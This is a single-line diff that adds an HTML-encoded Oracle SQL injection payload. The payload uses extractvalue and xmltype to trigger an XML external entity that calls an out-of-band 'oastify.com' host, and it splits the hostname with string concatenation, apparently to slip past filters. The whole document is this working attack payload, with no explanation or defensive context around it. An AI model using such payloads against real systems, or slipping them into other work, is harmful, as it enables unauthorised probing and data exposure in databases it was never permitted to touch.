@@ -1,0 +1,1 @@
+(select extractvalue(xmltype(&#039;&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;&lt;!DOCTYPE root [ &lt;!ENTITY % exave SYSTEM &quot;http://hg167a3hswy20zjhqzd0vw2cc3iw6tuwio5ft4.oasti&#039;||&#039;fy.com/&quot;&gt;%exave;]&gt;&#039;),&#039;/l&#039;) from dual)
